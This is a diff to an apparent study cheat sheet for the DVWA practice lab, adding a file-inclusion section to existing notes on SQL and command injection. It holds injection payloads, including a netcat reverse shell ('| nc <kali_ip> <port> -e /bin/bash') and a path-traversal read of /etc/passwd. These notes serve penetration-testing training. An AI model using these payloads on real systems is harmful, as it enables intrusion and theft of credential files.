@@ -1,4 +1,4 @@
-# SQL injection
+# SQL Injection
 <h3>low security level</h3>
 
 - To find all tables, from a database called “dvwa”: 
@@ -45,3 +45,9 @@
 - To show the list of files and directories: `| ls -la`
 - First run in terminal: `nc -lvp <port>`
 - To connect remotely with the kali-Linux using netcat nc in DVWA: `| nc <kali_ip> <port> -e /bin/bash`
+
+# File Inclusion:
+
+<h3>low/medium security level</h3>
+
+- To run a local file inclusion `/etc/passwd` and see the content of it: `/../../../../../etc/passwd`
